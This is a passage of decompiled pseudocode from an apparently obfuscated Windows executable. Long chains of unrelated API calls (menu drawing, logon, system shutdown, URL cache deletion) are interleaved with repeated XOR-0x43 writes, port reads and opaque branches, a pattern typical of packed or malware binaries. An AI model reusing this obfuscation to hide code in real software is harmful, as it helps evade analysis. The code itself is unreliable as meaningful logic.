in(0xcde6);\n                    if ((uVar6 & 1) != 0) {\n                        return 0xfffffff6;\n                    }\n                    Var12 = (*0x41f564)(extraout_ECX_24);\n                    *(uVar4 + 0x913bf16a) = *(uVar4 + 0x913bf16a) ^ 0x43;\n                    *(uVar4 + 0x71) = *(uVar4 + 0x71) - extraout_ECX_54;\n                    pcVar1 = Var12 + -0x69;\n                    *pcVar1 = *pcVar1 + -1;\n                    iVar7 = in(Var12 >> 0x20);\n                    piVar11[1] = iVar7 + -0x5078ceda;\n                    uVar6 = in(0xdb17);\n                    if ((uVar6 & 1) != uVar6) {\n                        return 0;\n                    }\n                    Var12 = (*_sym.imp.USER32.dll_DrawMenuBar)(extraout_ECX_54);\n                    *(uVar4 + 0x913bf16a) = *(uVar4 + 0x913bf16a) ^ 0x43;\n                    *(uVar4 + 0x71) = *(uVar4 + 0x71) - extraout_ECX_23;\n                    pcVar1 = Var12 + -0x69;\n                    *pcVar1 = *pcVar1 + -1;\n                    iVar7 = in(Var12 >> 0x20);\n                    piVar8 = piVar11 + 3;\n                    piVar11[2] = iVar7 + -0x5078ceda;\n                    uVar4 = in(0xcd42);\n                    piVar5 = uVar4 & 1;\n                    uVar13 = extraout_ECX_23;\n                    if (piVar5 != 0x588113f7) {\n                        return 0x588113fe;\n                    }\ncode_r0x0041d627:\n                    Var12 = (*_sym.imp.OLEAUT32.dll_GetRecordInfoFromTypeInfo)(uVar13);\n                    *(piVar5 + -0x6ec40e96) = *(piVar5 + -0x6ec40e96) ^ 0x43;\n                    *(piVar5 + 0x71) = *(piVar5 + 0x71) - extraout_ECX_44;\n                    pcVar1 = Var12 + -0x69;\n                    *pcVar1 = *pcVar1 + -1;\n                    iVar7 = in(Var12 >> 0x20);\n                    piVar10 = piVar8 + 1;\n                    *piVar8 = iVar7 + -0x5078ceda;\n                    iVar7 = in(0xd64c);\n                    piVar5 = piVar5 & 0xffff0000 | uStack144 & 0xffff;\n                    uVar13 = extraout_ECX_44;\n                    if (iVar7 == 0x588113f7) goto code_r0x0041ccc6;\ncode_r0x0041d425:\n                    Var12 = (*_sym.imp.KERNEL32.dll_GetOverlappedResult)(uVar13);\n                    *(piVar5 + -0x6ec40e96) = *(piVar5 + -0x6ec40e96) ^ 0x43;\n                    *(piVar5 + 0x71) = *(piVar5 + 0x71) - extraout_ECX_40;\n                    pcVar1 = Var12 + -0x69;\n                    *pcVar1 = *pcVar1 + -1;\n                    iVar7 = in(Var12 >> 0x20);\n                    *piVar10 = iVar7 + -0x5078ceda;\n                    in(iStack164);\n                    iStack164 = 0x41d488;\n                    iStack164._0_2_ = 0xd488;\n                    Var12 = (*_sym.imp.WININET.dll_DeleteUrlCacheEntryW)(extraout_ECX_40);\n                    *(piVar5 + -0x6ec40e96) = *(piVar5 + -0x6ec40e96) ^ 0x43;\n                    *(piVar5 + 0x71) = *(piVar5 + 0x71) - extraout_CL;\n                    pcVar1 = Var12 + -0x69;\n                    *pcVar1 = *pcVar1 + -1;\n                    iVar7 = in(Var12 >> 0x20);\n                    piVar10[1] = iVar7 + -0x5078ceda;\n                    iVar7 = in(0xd447);\n                    if (iVar7 != 0) {\n                        return 8;\n                    }\n                    Var12 = (*0x41f498)();\n                    *(piVar5 + -0x6ec40e96) = *(piVar5 + -0x6ec40e96) ^ 0x43;\n                    *(piVar5 + 0x71) = *(piVar5 + 0x71) - extraout_ECX_33;\n                    pcVar1 = Var12 + -0x69;\n                    *pcVar1 = *pcVar1 + -1;\n                    iVar7 = in(Var12 >> 0x20);\n                    piVar8 = piVar10 + 3;\n                    piVar10[2] = iVar7 + -0x5078ceda;\n                    iVar7 = in(0xd138);\n                    piVar5 = 0x588113f7;\n                    uVar13 = extraout_ECX_33;\n                    if (iVar7 == 0x588113f7) {\n                        Var12 = (*_sym.imp.SHLWAPI.dll_HashData)(extraout_ECX_33);\n                        *0xe9bd0561 = *0xe9bd0561 ^ 0x43;\n                        *0x58811468 = *0x58811468 - extraout_ECX_37;\n                        pcVar1 = Var12 + -0x69;\n                        *pcVar1 = *pcVar1 + -1;\n                        iVar7 = in(Var12 >> 0x20);\n                        piVar9 = piVar10 + 4;\n                        *piVar8 = iVar7 + -0x5078ceda;\n                        iVar7 = in(0xd2da);\n                        uVar13 = extraout_ECX_37;\n                        if (0x30be < iVar7) goto code_r0x0041d4e2;\n                        if (iVar7 == 0) goto code_r0x0041c73e;\n                        goto code_r0x0041c6f7;\n                    }\ncode_r0x0041c959:\n                    uVar3 = 0xc960;\n                    Var12 = (*_sym.imp.USER32.dll_GetLastActivePopup)(uVar13);\n                    *(piVar5 + -0x6ec40e96) = *(piVar5 + -0x6ec40e96) ^ 0x43;\n                    *(piVar5 + 0x71) = *(piVar5 + 0x71) - extraout_ECX_12;\n                    pcVar1 = Var12 + -0x69;\n                    *pcVar1 = *pcVar1 + -1;\n                    iVar7 = in(Var12 >> 0x20);\n                    *piVar8 = iVar7 + -0x5078ceda;\n                    in(iStack164);\n                    iStack164 = 0x41c997;\n                    Var12 = (*_sym.imp.USER32.dll_FindWindowW)(extraout_ECX_12);\n                    *(piVar5 + -0x6ec40e96) = *(piVar5 + -0x6ec40e96) ^ 0x43;\n                    *(piVar5 + 0x71) = *(piVar5 + 0x71) - extraout_ECX_13;\n                    pcVar1 = Var12 + -0x69;\n                    *pcVar1 = *pcVar1 + -1;\n                    iVar7 = in(Var12 >> 0x20);\n                    piVar9 = piVar8 + 2;\n                    piVar8[1] = iVar7 + -0x5078ceda;\n                    iVar7 = in(uStack156);\n                    uVar13 = extraout_ECX_13;\n                    if (iVar7 == 0) {\ncode_r0x0041cc1f:\n                        Var12 = (*_sym.imp.USER32.dll_GetMenuState)(uVar13);\n                        *(piVar5 + -0x6ec40e96) = *(piVar5 + -0x6ec40e96) ^ 0x43;\n                        *(piVar5 + 0x71) = *(piVar5 + 0x71) - extraout_ECX_20;\n                        pcVar1 = Var12 + -0x69;\n                        *pcVar1 = *pcVar1 + -1;\n                        iVar7 = in(Var12 >> 0x20);\n                        *piVar9 = iVar7 + -0x5078ceda;\n                        uStack36 = in(uStack148);\n                        uStack148 = 0x41cc6c;\n                        Var12 = (*_sym.imp.USER32.dll_LoadAcceleratorsA)();\n                        *(piVar5 + -0x6ec40e96) = *(piVar5 + -0x6ec40e96) ^ 0x43;\n                        *(piVar5 + 0x71) = *(piVar5 + 0x71) - extraout_ECX_21;\n                        pcVar1 = Var12 + -0x69;\n                        *pcVar1 = *pcVar1 + -1;\n                        iVar7 = in(Var12 >> 0x20);\n                        piVar9[1] = iVar7 + -0x5078ceda;\n                        uVar4 = in(uVar3);\n                        uStack36 = uStack36 & 0xffff0000;\n                        if ((uVar4 & 1) != 0) {\n                            return 5;\n                        }\n                        Var12 = (*_sym.imp.KERNEL32.dll_IsWow64Process)(extraout_ECX_21);\n                        *(piVar5 + -0x6ec40e96) = *(piVar5 + -0x6ec40e96) ^ 0x43;\n                        *(piVar5 + 0x71) = *(piVar5 + 0x71) - extraout_ECX_34;\n                        pcVar1 = Var12 + -0x69;\n                        *pcVar1 = *pcVar1 + -1;\n                        iVar7 = in(Var12 >> 0x20);\n                        piVar9[2] = iVar7 + -0x5078ceda;\n                        in(iStack164);\n                        iStack164 = 0x41d215;\n                        Var12 = (*_sym.imp.ADVAPI32.dll_GetSidIdentifierAuthority)(extraout_ECX_34);\n                        *(piVar5 + -0x6ec40e96) = *(piVar5 + -0x6ec40e96) ^ 0x43;\n                        *(piVar5 + 0x71) = *(piVar5 + 0x71) - extraout_ECX_35;\n                        pcVar1 = Var12 + -0x69;\n                        *pcVar1 = *pcVar1 + -1;\n                        iVar7 = in(Var12 >> 0x20);\n                        piVar9[3] = iVar7 + -0x5078ceda;\n                        in(0xcc34);\n                        uStack156 = 0x41d24d;\n                        Var12 = (*_sym.imp.KERNEL32.dll_GetTimeZoneInformation)(extraout_ECX_35);\n                        *(piVar5 + -0x6ec40e96) = *(piVar5 + -0x6ec40e96) ^ 0x43;\n                        *(piVar5 + 0x71) = *(piVar5 + 0x71) - extraout_ECX_36;\n                        pcVar1 = Var12 + -0x69;\n                        *pcVar1 = *pcVar1 + -1;\n                        iVar7 = in(Var12 >> 0x20);\n                        piVar9[4] = iVar7 + -0x5078ceda;\n                        uVar4 = in(0xd1c7);\n                        if ((uVar4 & 1) != uVar4) {\n                            return 0xfffffff8;\n                        }\n                        Var12 = (*_sym.imp.ADVAPI32.dll_GetServiceDisplayNameW)(extraout_ECX_36);\n                        *(piVar5 + -0x6ec40e96) = *(piVar5 + -0x6ec40e96) ^ 0x43;\n                        *(piVar5 + 0x71) = *(piVar5 + 0x71) - extraout_ECX_16;\n                        pcVar1 = Var12 + -0x69;\n                        *pcVar1 = *pcVar1 + -1;\n                        iVar7 = in(Var12 >> 0x20);\n                        piVar9[5] = iVar7 + -0x5078ceda;\n                        iVar7 = in(0xca93);\n                        piVar8 = 0x172c7f5b;\n                        piVar5 = piStack128;\n                        piVar9 = piStack24;\n                        uVar13 = extraout_ECX_16;\n                        uStack144 = extraout_ECX_20;\n                        if (iVar7 == 0x588113f7) {\n                            Var12 = (*_sym.imp.KERNEL32.dll_IsValidLocale)(extraout_ECX_16);\n                            *0xa86870c5 = *0xa86870c5 ^ 0x43;\n                            *0x172c7fcc = *0x172c7fcc - extraout_ECX_10;\n                            pcVar1 = Var12 + -0x69;\n                            *pcVar1 = *pcVar1 + -1;\n                            iVar7 = in(Var12 >> 0x20);\n                            *piStack24 = iVar7 + -0x5078ceda;\n                            in(0xd215);\n                            Var12 = (*0x41f45c)(extraout_ECX_10);\n                            *0xa86870c5 = *0xa86870c5 ^ 0x43;\n                            *0x172c7fcc = *0x172c7fcc - extraout_ECX_11;\n                            pcVar1 = Var12 + -0x69;\n                            *pcVar1 = *pcVar1 + -1;\n                            iVar7 = in(Var12 >> 0x20);\n                            piStack24[1] = iVar7 + -0x5078ceda;\n                            in(0xc8b0);\n                            Var12 = (*_sym.imp.KERNEL32.dll_GetExitCodeThread)(extraout_ECX_11);\n                            *0xa86870c5 = *0xa86870c5 ^ 0x43;\n                            *0x172c7fcc = *0x172c7fcc - extraout_ECX_65;\n                            pcVar1 = Var12 + -0x69;\n                            *pcVar1 = *pcVar1 + -1;\n                            iVar7 = in(Var12 >> 0x20);\n                            piStack24[2] = iVar7 + -0x5078ceda;\n                            in(0xc8e7);\n                            iStack164 = 0x41e010;\n                            Var12 = (*_sym.imp.KERNEL32.dll_GetAtomNameA)(extraout_ECX_65);\n                            *0xa86870c5 = *0xa86870c5 ^ 0x43;\n                            *0x172c7fcc = *0x172c7fcc - extraout_ECX_66;\n                            pcVar1 = Var12 + -0x69;\n                            *pcVar1 = *pcVar1 + -1;\n                            iVar7 = in(Var12 >> 0x20);\n                            piVar10 = piStack24 + 4;\n                            piStack24[3] = iVar7 + -0x5078ceda;\n                            iVar7 = in(0xdfc7);\n                            piVar11 = piVar10;\n                            uVar13 = extraout_ECX_66;\n                            if (iVar7 == 0) goto code_r0x0041d09c;\n                            goto code_r0x0041d04c;\n                        }\ncode_r0x0041d3de:\n                        piVar8 = piVar5;\n                        Var12 = (*_sym.imp.ADVAPI32.dll_LogonUserA)(uVar13);\n                        *(piVar8 + -0x6ec40e96) = *(piVar8 + -0x6ec40e96) ^ 0x43;\n                        *(piVar8 + 0x71) = *(piVar8 + 0x71) - extraout_ECX_39;\n                        pcVar1 = Var12 + -0x69;\n                        *pcVar1 = *pcVar1 + -1;\n                        iVar7 = in(Var12 >> 0x20);\n                        piVar11 = piVar9 + 1;\n                        *piVar9 = iVar7 + -0x5078ceda;\n                        iVar7 = in(0xd3e5);\n                        piVar5 = piVar8;\n                        uVar13 = extraout_ECX_39;\n                        if (iVar7 != 0) {\ncode_r0x0041d04c:\n                            Var12 = (*_sym.imp.USER32.dll_LockWorkStation)(uVar13);\n                            *(piVar8 + -0x6ec40e96) = *(piVar8 + -0x6ec40e96) ^ 0x43;\n                            *(piVar8 + 0x71) = *(piVar8 + 0x71) - extraout_ECX_31;\n                            pcVar1 = Var12 + -0x69;\n                            *pcVar1 = *pcVar1 + -1;\n                            iVar7 = in(Var12 >> 0x20);\n                            piVar10 = piVar11 + 1;\n                            *piVar11 = iVar7 + -0x5078ceda;\n                            iVar7 = in(0xd061);\n                            piVar5 = piVar8;\n                            if (iVar7 != 0) {\ncode_r0x0041d09c:\n                                Var12 = (*_sym.imp.USER32.dll_GetWindowRgn)();\n                                *(piVar5 + -0x6ec40e96) = *(piVar5 + -0x6ec40e96) ^ 0x43;\n                                *(piVar5 + 0x71) = *(piVar5 + 0x71) - extraout_ECX_32;\n                                pcVar1 = Var12 + -0x69;\n                                *pcVar1 = *pcVar1 + -1;\n                                iVar7 = in(Var12 >> 0x20);\n                                piVar9 = piVar10 + 1;\n                                *piVar10 = iVar7 + -0x5078ceda;\n                                iVar7 = in(0xd0d9);\n                                piVar11 = piVar9;\n                                if (uStack87 < iVar7) goto code_r0x0041c4f3;\n                                uVar13 = extraout_ECX_32;\n                                if (iVar7 != 0x588113f7) {\ncode_r0x0041d33e:\n                                    do {\n                                        Var12 = (*_sym.imp.USER32.dll_ExcludeUpdateRgn)(uVar13);\n                                        *(piVar5 + -0x6ec40e96) = *(piVar5 + -0x6ec40e96) ^ 0x43;\n                                        *(piVar5 + 0x71) = *(piVar5 + 0x71) - extraout_ECX_38;\n                                        pcVar1 = Var12 + -0x69;\n                                        *pcVar1 = *pcVar1 + -1;\n                                        iVar7 = in(Var12 >> 0x20);\n                                        *piVar9 = iVar7 + -0x5078ceda;\n                                        uVar4 = in(0xd355);\n                                        piVar5 = uStack132 ^ 0xffffffff;\n                                        piVar9 = piVar9 + 1 & 0xffff0000;\n                                        if (uStack36._2_2_ + 0x5085U <= uVar4) {\n                                            piVar10 = piVar9;\n                                            uVar13 = extraout_ECX_38;\n                                            if ((uVar4 & 1) != 0) {\n                                                return 0xa77ed38a;\n                                            }\n                                            goto code_r0x0041d425;\n                                        }\ncode_r0x0041c73e:\n                                        Var12 = (*_sym.imp.OLEAUT32.dll_VariantTimeToSystemTime)();\n                                        *(piVar5 + -0x6ec40e96) = *(piVar5 + -0x6ec40e96) ^ 0x43;\n                                        *(piVar5 + 0x71) = *(piVar5 + 0x71) - extraout_ECX_07;\n                                        pcVar1 = Var12 + -0x69;\n                                        *pcVar1 = *pcVar1 + -1;\n                                        iVar7 = in(Var12 >> 0x20);\n                                        *piVar9 = iVar7 + -0x5078ceda;\n                                        uVar4 = in(0xc745);\n                                        if ((uVar4 & 1) != 0xa77eec09) {\n                                            return 4;\n                                        }\n                                        Var12 = (*0x41f3c0)(extraout_ECX_07);\n                                        *(piVar5 + -0x6ec40e96) = *(piVar5 + -0x6ec40e96) ^ 0x43;\n                                        *(piVar5 + 0x71) = *(piVar5 + 0x71) - extraout_ECX_59;\n                                        pcVar1 = Var12 + -0x69;\n                                        *pcVar1 = *pcVar1 + -1;\n                                        iVar7 = in(Var12 >> 0x20);\n                                        piVar9[1] = iVar7 + -0x5078ceda;\n                                        in(iStack164);\n                                        iStack164 = 0x41ddb3;\n                                        Var12 = (*0x41f3b4)(extraout_ECX_59);\n                                        *(piVar5 + -0x6ec40e96) = *(piVar5 + -0x6ec40e96) ^ 0x43;\n                                        *(piVar5 + 0x71) = *(piVar5 + 0x71) - extraout_ECX_60;\n                                        pcVar1 = Var12 + -0x69;\n                                        *pcVar1 = *pcVar1 + -1;\n                                        iVar7 = in(Var12 >> 0x20);\n                                        piVar9[2] = iVar7 + -0x5078ceda;\n                                        in(0xdd7c);\n                                        Var12 = (*_sym.imp.RPCRT4.dll_RpcRaiseException)(extraout_ECX_60);\n                                        *(piVar5 + -0x6ec40e96) = *(piVar5 + -0x6ec40e96) ^ 0x43;\n                                        *(piVar5 + 0x71) = *(piVar5 + 0x71) - extraout_ECX_64;\n                                        pcVar1 = Var12 + -0x69;\n                                        *pcVar1 = *pcVar1 + -1;\n                                        iVar7 = in(Var12 >> 0x20);\n                                        piVar9[3] = iVar7 + -0x5078ceda;\n                                        uVar4 = in(0xdf52);\n                                        if ((uVar4 & 0x58812c76) != 0) {\n                                            return 6;\n                                        }\n                                        Var12 = (*_sym.imp.KERNEL32.dll_GetPrivateProfileStringA)(extraout_ECX_64);\n                                        *(piVar5 + -0x6ec40e96) = *(piVar5 + -0x6ec40e96) ^ 0x43;\n                                        *(piVar5 + 0x71) = *(piVar5 + 0x71) - extraout_ECX_52;\n                                        pcVar1 = Var12 + -0x69;\n                                        *pcVar1 = *pcVar1 + -1;\n                                        iVar7 = in(Var12 >> 0x20);\n                                        piVar10 = piVar9 + 5;\n                                        piVar9[4] = iVar7 + -0x5078ceda;\n                                        uVar4 = in(0xda26);\n                                        piVar5 = uVar4 & 1;\n                                        uVar13 = extraout_ECX_52;\n                                        if (piVar5 != NULL) {\n                                            return 0x58812c70;\n                                        }\ncode_r0x0041dc91:\n                                        Var12 = (*_sym.imp.ole32.dll_MkParseDisplayName)(uVar13);\n                                        *(piVar5 + -0x6ec40e96) = *(piVar5 + -0x6ec40e96) ^ 0x43;\n                                        *(piVar5 + 0x71) = *(piVar5 + 0x71) - extraout_ECX_57;\n                                        pcVar1 = Var12 + -0x69;\n                                        *pcVar1 = *pcVar1 + -1;\n                                        iVar7 = in(Var12 >> 0x20);\n                                        piVar11 = piVar10 + 1;\n                                        *piVar10 = iVar7 + -0x5078ceda;\n                                        iVar7 = in(0xdc98);\n                                        if (iVar7 != 0) goto code_r0x0041ce33;\n                                        Var12 = (*_sym.imp.KERNEL32.dll_GetTapePosition)(extraout_ECX_57);\n                                        *(piVar5 + -0x6ec40e96) = *(piVar5 + -0x6ec40e96) ^ 0x43;\n                                        *(piVar5 + 0x71) = *(piVar5 + 0x71) - extraout_ECX_43;\n                                        pcVar1 = Var12 + -0x69;\n                                        *pcVar1 = *pcVar1 + -1;\n                                        iVar7 = in(Var12 >> 0x20);\n                                        piVar10 = piVar10 + 2;\n                                        *piVar11 = iVar7 + -0x5078ceda;\n                                        iVar7 = in(0xd5d5);\n                                        uVar13 = extraout_ECX_43;\n                                        if (iVar7 == 0) goto code_r0x0041ca39;\ncode_r0x0041ccc6:\n                                        Var12 = (*_sym.imp.KERNEL32.dll_FlushFileBuffers)();\n                                        *(piVar5 + -0x6ec40e96) = *(piVar5 + -0x6ec40e96) ^ 0x43;\n                                        *(piVar5 + 0x71) = *(piVar5 + 0x71) - extraout_ECX_22;\n                                        pcVar1 = Var12 + -0x69;\n                                        *pcVar1 = *pcVar1 + -1;\n                                        iVar7 = in(Var12 >> 0x20);\n                                        piVar9 = piVar10 + 1;\n                                        *piVar10 = iVar7 + -0x5078ceda;\n                                        iVar7 = in(0xcccd);\n                                        piVar5 = piStack24;\n                                        uVar13 = extraout_ECX_22;\n                                    } while (iVar7 != 0);\n                                    Var12 = (*_sym.imp.ADVAPI32.dll_InitiateSystemShutdownA)();\n                                    *(piStack24 + -0x6ec40e96) = *(piStack24 + -0x6ec40e96) ^ 0x43;\n                                    *(piStack24 + 0x71) = *(piStack24 + 0x71) - extraout_ECX_67;\n                                    pcVar1 = Var12 + -0x69;\n                                    *pcVar1 = *pcVar1 + -1;\n                                    iVar7 = in(Var12 >> 0x20);\n                                    piVar11 = piVar10 + 2;\n                                    *piVar9 = iVar7 + -0x5078ceda;\n                                    iVar7 = in(0xe066);\n                                    if (iVar7 == 0) {\n                                        Var12 = (*_sym.imp.KERNEL32.dll_GetPrivateProfileIntW)(extraout_ECX_67);\n                                        *(piStack24 + -0x6ec40e96) = *(piStack24 + -0x6ec40e96) ^ 0x43;\n                                        *(piStack24 + 0x71) = *(piStack24 + 0x71) - extraout_ECX_19;\n                                        pcVar1 = Var12 + -0x69;\n                                        *pcVar1 = *pcVar1 + -1;\n                                        iVar7 = in(Var12 >> 0x20);\n                                        *piVar11 = iVar7 + -0x5078ceda;\n                                        uVar4 = in(0xcbab);\n                                        if ((uVar4 & 1) != 0) {\n                                            return 1;\n                                        }\n                                        Var12 = (*_sym.imp.USER32.dll_DrawTextW)(extraout_ECX_19);\n                                        *(piStack24 + -0x6ec40e96) = *(piStack24 + -0x6ec40e96) ^ 0x43;\n                                        *(piStack24 + 0x71) = *(piStack24 + 0x71) - extraout_ECX_08;\n                                        pcVar1 = Var12 + -0x69;\n                                        *pcVar1 = *pcVar1 + -1;\n                                        iVar7 = in(Var12 >> 0x20);\n                                        piVar10[3] = iVar7 + -0x5078ceda;\n                                        uVar4 = in(0xc803);\n                                        if ((uVar4 & 1) != 0) {\n                                            return 0xffffffff;\n                                        }\n                                        Var12 = (*_sym.imp.USER32.dll_GetWindowLongW)(extraout_ECX_08);\n                                        *(piStack24 + -0x6ec40e96) = *(piStack24 + -0x6ec40e96) ^ 0x43;\n                                        *(piStack24 + 0x71) = *(piStack24 + 0x71) - extraout_ECX_53;\n                                        pcVar1 = Var12 + -0x69;\n                                        *pcVar1 = *pcVar1 + -1;\n                                        iVar7 = in(Var12 >> 0x20);\n                                        piVar8 = piVar10 + 5;\n                                        piVar10[4] = iVar7 + -0x5078ceda;\n                                        iVar7 = in(0xdab5);\n                                        uVar4 = extraout_ECX_53;\n                                        if (iVar7 == 0) goto code_r0x0041ce90;\n                                        goto code_r0x0041d6e5;\n                                    }\n                                    goto code_r0x0041c4f3;\n                                }\ncode_r0x0041c6f7:\n                                Var12 = (*0x41f3d2)(uVar13);\n                                *(piVar5 + -0x6ec40e96) = *(piVar5 + -0x6ec40e96) ^ 0x43;\n                                *(piVar5 + 0x71) = *(piVar5 + 0x71) - extraout_ECX_06;\n                                pcVar1 = Var12 + -0x69;\n                                *pcVar1 = *pcVar1 + -1;\n                                iVar7 = in(Var12 >> 0x20);\n                                piVar10 = piVar9 + 1;\n                                *piVar9 = iVar7 + -0x5078ceda;\n                                iVar7 = in(0xc6fe);\n                                piVar9 = piVar10;\n                                uVar13 = extraout_ECX_06;\n                                if (iVar7 != 0) goto code_r0x0041dc91;\ncode_r0x0041d4e2:\n                                Var12 = (*_sym.imp.KERNEL32.dll_LocalFree)(uVar13);\n                                *(piVar5 + -0x6ec40e96) = *(piVar5 + -0x6ec40e96) ^ 0x43;\n                                *(piVar5 + 0x71) = *(piVar5 + 0x71) - extraout_ECX_41;\n                                pcVar1 = Var12 + -0x69;\n                                *pcVar1 = *pcVar1 + -1;\n                                iVar7 = in(Var12 >> 0x20);\n                                piVar11 = piVar9 + 1;\n                                *piVar9 = iVar7 + -0x5078ceda;\n                                iVar7 = in(0xd4fe);\n                                piVar8 = piVar5;\n                                if (iVar7 == -0x79) goto code_r0x0041c9d7;\n                                uVar13 = extraout_ECX_41;\n                                if (iVar7 == 0) {\n                                    Var12 = (*_sym.imp.ADVAPI32.dll_LookupPrivilegeNameW)(extraout_ECX_41);\n                                    *(piVar5 + -0x6ec40e96) = *(piVar5 + -0x6ec40e96) ^ 0x43;\n                                    *(piVar5 + 0x71) = *(piVar5 + 0x71) - extraout_ECX_49;\n                                    pcVar1 = Var12 + -0x69;\n                                    *pcVar1 = *pcVar1 + -1;\n                                    iVar7 = in(Var12 >> 0x20);\n                                    piVar9 = piVar9 + 2;\n                                    *piVar11 = iVar7 + -0x5078ceda;\n                                    piVar11 = _sym.imp.KERNEL32.dll_GetSystemWindowsDirectoryA;\n                                    piVar5 = in(0xd89a);\n                                    uVar13 = extraout_ECX_49;\n                                    if (piVar5 == NULL) {\n                                        Var12 = (*_sym.imp.KERNEL32.dll_GetSystemWindowsDirectoryA)();\n                                        *0xe9bd1dda = *0xe9bd1dda ^ 0x43;\n                                        *0x58812ce1 = *0x58812ce1 - extraout_ECX_03;\n                                        pcVar1 = Var12 + -0x69;\n                                        *pcVar1 = *pcVar1 + -1;\n                                        iVar7 = in(Var12 >> 0x20);\n                                        *piVar11 = iVar7 + -0x5078ceda;\n                                        uVar4 = in(0xc580);\n                                        piVar9 = uVar4 & 1;\n                                        piVar5 = 0x58812c70;\n                                        uVar13 = extraout_ECX_03;\n                                        if (piVar9 != NULL) {\n                                            return 0x58812c70;\n                                        }\n                                        goto code_r0x0041d33e;\n                                    }\n                                    goto code_r0x0041d3de;\n                                }\n                                goto code_r0x0041dceb;\n                            }\n                            piVar5 = piVar8 & 0xffff0000 | 0x3dca;\n                            Var12 = (*_sym.imp.WININET.dll_FindNextUrlCacheEntryW)(extraout_ECX_31);\n                            *(piVar5 + -0x6ec40e96) = *(piVar5 + -0x6ec40e96) ^ 0x43;\n                            *(piVar5 + 0x71) = *(piVar5 + 0x71) - extraout_ECX_55;\n                            pcVar1 = Var12 + -0x69;\n                            *pcVar1 = *pcVar1 + -1;\n                            iVar7 = in(Var12 >> 0x20);\n                            piVar9 = piVar11 + 2;\n                            *piVar10 = iVar7 + -0x5078ceda;\n                            uVar4 = in(0xdb67);\n                            uVar13 = extraout_ECX_55;\n                            if ((uVar4 & 1) != 0) {\n                                return 5;\n                            }\n                            goto code_r0x0041ddf2;\n                        }\ncode_r0x0041c4f3:\n                        Var12 = (*_sym.imp.USER32.dll_LookupIconIdFromDirectoryEx)();\n                        *(piVar5 + -0x6ec40e96) = *(piVar5 + -0x6ec40e96) ^ 0x43;\n                        *(piVar5 + 0x71) = *(piVar5 + 0x71) - extraout_ECX_02;\n                        pcVar1 = Var12 + -0x69;\n                        *pcVar1 = *pcVar1 + -1;\n                        iVar7 = in(Var12 >> 0x20);\n                        piVar9 = piVar11 + 1;\n                        *piVar11 = iVar7 + -0x5078ceda;\n                        iVar7 = in(0xc4fa);\n                        uVar13 = extraout_ECX_02;\n                        if (iVar7 != 0) {\ncode_r0x0041ddf2:\n                            Var12 = (*_sym.imp.KERNEL32.dll_EnumResourceTypesA)(uVar13);\n                            *(piVar5 + -0x6ec40e96) = *(piVar5 + -0x6ec40e96) ^ 0x43;\n                            *(piVar5 + 0x71) = *(piVar5 + 0x71) - extraout_ECX_61;\n                            pcVar1 = Var12 + -0x69;\n                            *pcVar1 = *pcVar1 + -1;\n                            iVar7 = in(Var12 >> 0x20);\n                            *piVar9 = iVar7 + -0x5078ceda;\n                            in(iStack164);\n                            Var12 = (*_sym.imp.USER32.dll_FlashWindowEx)(extraout_ECX_61);\n                            *(piVar5 + -0x6ec40e96) = *(piVar5 + -0x6ec40e96) ^ 0x43;\n                            *(piVar5 + 0x71) = *(piVar5 + 0x71) - extraout_ECX_62;\n                            pcVar1 = Var12 + -0x69;\n                            *pcVar1 = *pcVar1 + -1;\n                            iVar7 = in(Var12 >> 0x20);\n                            piVar9[1] = iVar7 + -0x5078ceda;\n                            uVar4 = in(0xddf9);\n                            uVar13 = extraout_ECX_62;\n                            if ((uVar4 < 0x3d169ebb) && ((uVar4 & 1) != 0)) {\n                                return 0xa77ed38a;\n                            }\ncode_r0x0041d8fa:\n                            Var12 = (*_sym.imp.USER32.dll_CharNextW)(uVar13);\n                            *(piStack24 + -0x6ec40e96) = *(piStack24 + -0x6ec40e96) ^ 0x43;\n                            *(piStack24 + 0x71) = *(piStack24 + 0x71) - extraout_ECX_50;\n                            pcVar1 = Var12 + -0x69;\n                            *pcVar1 = *pcVar1 + -1;\n                            iVar7 = in(Var12 >> 0x20);\n                            uVar4 = in(0xd93f);\n                            if ((uVar4 & 0x588113fc) != 0) {\n                                *0x588113f8 = iVar7 + -0x5078ceda;\n                                return uVar4;\n                            }\n                            *0x588113f8 = iVar7 + -0x5078ceda;\n                            return extraout_ECX_50;\n                        }\n                        goto code_r0x0041e0a6;\n                    }\n                }\n                else {\ncode_r0x0041ca39:\n                    uVar3 = 0xca40;\n                    Var12 = (*_sym.imp.KERNEL32.dll_GetPrivateProfileSectionW)(uVar13);\n                    *(piVar5 + -0x6ec40e96) = *(piVar5 + -0x6ec40e96) ^ 0x43;\n                    *(piVar5 + 0x71) = *(piVar5 + 0x71) - extraout_ECX_15;\n                    pcVar1 = Var12 + -0x69;\n                    *pcVar1 = *pcVar1 + -1;\n                    iVar7 = in(Var12 >> 0x20);\n                    piVar9 = piVar10 + 1;\n                    *piVar10 = iVar7 + -0x5078ceda;\n                    in(uStack156);\n                    uVar13 = extraout_ECX_15;\n                }\n                uStack156 = 0x41e10a;\n                Var12 = (*_sym.imp.WINMM.dll_mmioSendMessage)(uVar13);\n                *(piVar5 + -0x6ec40e96) = *(piVar5 + -0x6ec40e96) ^ 0x43;\n                *(piVar5 + 0x71) = *(piVar5 + 0x71) - extraout_ECX_69;\n                pcVar1 = Var12 + -0x69;\n                *pcVar1 = *pcVar1 + -1;\n                iVar7 = in(Var12 >> 0x20);\n                piVar11 = piVar9 + 1;\n                *piVar9 = iVar7 + -0x5078ceda;\n                uVar4 = in(uVar3);\n                uStack104 = 3;\n                uVar13 = extraout_ECX_69;\n            } while ((uVar4 & 1) == 0);\n        }\n    }\n    return uStack104;\ncode_r0x0041ce33:\n    Var12 = (*_sym.imp.USER32.dll_IsWindowVisible)();\n    *(piVar5 + -0x6ec40e96) = *(piVar5 + -0x6ec40e96) ^ 0x43;\n    *(piVar5 + 0x71) = *(piVar5 + 0x71) - extraout_ECX_25;\n    pcVar1 = Var12 + -0x69;\n    *pcVar1 = *pcVar1 + -1;\n    iVar7 = in(Var12 >> 0x20);\n    piVar8 = piVar11 + 1;\n    *piVar11 = iVar7 + -0x5078ceda;\n    iVar7 = in(0xce50);\n    uVar13 = extraout_ECX_25;\n    if (iVar7 != 0) goto code_r0x0041c959;\n    Var12 = (*_sym.imp.GDI32.dll_GetCurrentPositionEx)();\n    *(piVar5 + -0x6ec40e96) = *(piVar5 + -0x6ec40e96) ^ 0x43;\n    *(piVar5 + 0x71) = *(piVar5 + 0x71) - extraout_ECX_29;\n    pcVar1 = Var12 + -0x69;\n    *pcVar1 = *pcVar1 + -1;\n    iVar7 = in(Var12 >> 0x20);\n    